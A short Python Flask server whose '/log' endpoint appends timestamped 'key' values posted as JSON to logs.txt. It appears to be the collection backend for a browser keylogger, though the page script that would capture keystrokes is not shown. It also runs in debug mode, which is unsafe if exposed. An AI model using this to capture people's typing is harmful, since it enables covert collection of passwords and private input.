from flask import Flask, request, render_template
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log_key():
    data = request.get_json()
    key = data.get('key')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open("logs.txt", "a") as f:
        f.write(f"{timestamp} - {key}\n")

    return {'status': 'logged'}

if __name__ == '__main__':
    app.run(debug=True)